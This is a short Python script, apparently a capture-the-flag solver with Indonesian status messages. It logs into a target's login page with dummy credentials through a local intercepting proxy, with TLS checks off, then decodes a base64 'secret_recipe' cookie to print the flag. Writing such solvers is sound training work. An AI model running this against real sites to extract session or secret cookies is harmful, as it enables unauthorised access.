import sys
import requests
from urllib.parse import unquote
import base64
import time
proxies = proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def main():
    if len(sys.argv) != 2:
        print("(-) masukkan url")
        time.sleep(2)
        sys.exit(-1)
    url = sys.argv[1]
    s = requests.session()
    r = s.get(url=url, verify=False, proxies=proxies)
    if r.status_code == 200:
        print("(+) sudah menjangkau web")
        time.sleep(2)
        login = url + '/login.php'
        data = {"username": "asd", "password": "asd"}
        r = s.post(url=login, data=data, proxies=proxies, verify=False)
        if r.status_code == 200:
            print("(+) mencoba login")
            time.sleep(2)
            cookie = s.cookies.get("secret_recipe")
            print("(+) dapet cookienya")
            time.sleep(2)
            print("(+) decode cookienya")
            time.sleep(2)
            url_decode = unquote(cookie)
            decode1 = base64.b64decode(url_decode)
            decode2 = decode1.decode("utf-8")
            print("(+) ini flagnya = " + decode2)


    else:
        print("(-) gagal")

if __name__ == "__main__":
    main()
